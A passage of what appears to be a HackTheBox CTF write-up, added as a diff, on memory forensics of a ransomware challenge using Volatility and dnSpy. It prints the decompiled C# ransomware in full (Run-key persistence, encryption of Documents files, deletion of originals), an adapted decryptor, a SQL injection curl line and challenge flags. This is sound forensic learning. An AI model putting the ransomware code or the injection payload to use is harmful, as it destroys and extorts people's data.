@@ -171,4 +171,230 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%
 
 - flag: `HTB{t4nn3n_fr4m3d_th3_mcFly}`
 
-### 
+### Unfinished Business
+
+#### While in prison, he developed a ransomware to infect Marty's computer. Now, every time Marty reboots his computer, his files get encrypted. Without being able to access them, Marty cannot follow the plan Mr.Brown sent to him, in order to escape the Old West before it is too late.
+
+- this challenge was amazing, i loved it so much
+- it wasn't necessarily hard but it was def fun!
+- starting off with a memdump and an encrypted pdf file
+- a quick recap of things i looked for using vol.py:
+  - sus connections 
+  - sus command lines
+  - sus reg keys
+
+- at this point i wanted to look through files and i was already aware that `marty` is the user:
+
+```
+HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Downloads
+Volatility Foundation Volatility Framework 2.6.1
+0x000000003e298038      2      0 R--rwd \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
+0x000000003e29e4d8      5      0 R--r-d \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
+0x000000003e2a1910      2      0 R--rwd \Device\HarddiskVolume1\Users\Marty\Downloads\desktop.ini
+0x000000003e693be8      5      0 R--r-d \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
+```
+
+- bingo! i see that there's a `Rans.exe` file that likely stands for ransomware
+- i dump it and try to reverse it but its very complicated with a ton going on, i highly doubt this is the route so i take a step back and look for other files that start with `Rans`
+
+```
+HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Rans
+Volatility Foundation Volatility Framework 2.6.1
+0x000000003f4b7038      6      0 R--r-d \Device\HarddiskVolume1\Users\Marty\AppData\Local\Temp\.net\Rans\LnxLq3C8fV66obdZMxa9l3pHdLe0wqc=\Rans.dll
+```
+
+- bam! `Rans.dll`, i download it and throw it in dnspy and i get the following code:
+
+#### original code found in dnspy
+```
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using Microsoft.Win32;
+
+namespace Rans
+{
+	// Token: 0x02000002 RID: 2
+	internal class Program
+	{
+		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+		private static void Main(string[] args)
+		{
+			string sDir = string.Format("C:\\Users\\{0}\\Documents", Environment.UserName);
+			Program.CheckRunKey();
+			Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
+		}
+
+		// Token: 0x06000002 RID: 2 RVA: 0x00002070 File Offset: 0x00000270
+		public static void CheckRunKey()
+		{
+			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+			if (!registryKey.GetValueNames().Contains("Rans"))
+			{
+				FileInfo fileInfo = new FileInfo("Rans.exe");
+				registryKey.SetValue("Rans", fileInfo.FullName);
+			}
+		}
+
+		// Token: 0x06000003 RID: 3 RVA: 0x000020BC File Offset: 0x000002BC
+		public static void ParseDir(string sDir, string key)
+		{
+			List<string> list = new List<string>
+			{
+				"jpg",
+				"mp3",
+				"mp4",
+				"png",
+				"pdf",
+				"txt",
+				"doc",
+				"docx",
+				"docm",
+				"ppt",
+				"pptx",
+				"xls",
+				"xlsx"
+			};
+			foreach (string text in Directory.GetFiles(sDir))
+			{
+				string[] array = text.Split('.', StringSplitOptions.None);
+				string item = array[1];
+				string text2 = array[array.Length - 1];
+				if (list.Contains(item) && !text2.Equals("enc"))
+				{
+					Console.WriteLine("Encrypting: " + text);
+					Program.EncryptFile(text, key);
+				}
+			}
+		}
+
+		// Token: 0x06000004 RID: 4 RVA: 0x000021BC File Offset: 0x000003BC
+		public static void EncryptFile(string file, string key)
+		{
+			byte[] array = File.ReadAllBytes(file);
+			byte[] iv = new byte[]
+			{
+				99,
+				104,
+				105,
+				99,
+				107,
+				101,
+				110,
+				32,
+				77,
+				97,
+				114,
+				116,
+				121,
+				33,
+				33,
+				33
+			};
+			SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
+			HashAlgorithm hashAlgorithm = MD5.Create();
+			symmetricAlgorithm.BlockSize = 128;
+			symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
+			symmetricAlgorithm.IV = iv;
+			using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".enc", FileMode.Create, FileAccess.Write), symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
+			{
+				cryptoStream.Write(array, 0, array.Length);
+			}
+			File.Delete(file);
+		}
+	}
+}
+```
+
+- this looks like the encryptor, its reading files in the documents dir and encrypting them, all it'll take is slight reverse engineering and we can get the c# program to decrypt it:
+
+#### edited file to decrypt the data
+```
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using Microsoft.Win32;
+
+namespace decryptor
+{
+
+    class Program
+    {
+        private static void Main(string[] args)
+        {
+            string sDir = string.Format("c:/tmp", Environment.UserName);
+            Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
+        }
+
+        public static void ParseDir(string sDir, string key)
+        {
+            List<string> list = new List<string>
+            {
+                "enc","pdf"
+            };
+            foreach (string text in Directory.GetFiles(sDir))
+            {
+                string[] array = text.Split('.', StringSplitOptions.None);
+                string item = array[1];
+                string text2 = array[array.Length - 1];
+                if (list.Contains(item) && text2.Equals("enc"))
+                {
+                    Program.DecryptFile(text, key);
+                }
+            }
+        }
+        public static void DecryptFile(string file, string key)
+        {
+            byte[] array = File.ReadAllBytes(file);
+            byte[] iv = new byte[]
+            {
+                99,
+                104,
+                105,
+                99,
+                107,
+                101,
+                110,
+                32,
+                77,
+                97,
+                114,
+                116,
+                121,
+                33,
+                33,
+                33
+            };
+            SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
+            HashAlgorithm hashAlgorithm = MD5.Create();
+            symmetricAlgorithm.BlockSize = 128;
+            symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
+            symmetricAlgorithm.IV = iv;
+
+            using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".dec", FileMode.Create), symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write))
+            {
+                cryptoStream.Write(array, 0, array.Length);
+            }
+            File.Delete(file);
+        }
+    }
+}
+```
+
+- main changes:
+  - limiting file look up to enc in the tmp dir
+  - allowing enc files
+  - adjusting the code in the `EncryptFile` to decrypt instead
+
+running it results in a decrypted file and the flag:
+
+![](assets/images/htb-ctf-usf-unfinished-business.png)
+
+- flag: HTB{4n0the3r_0n3_T4nn3n_d3f34t3d}
+
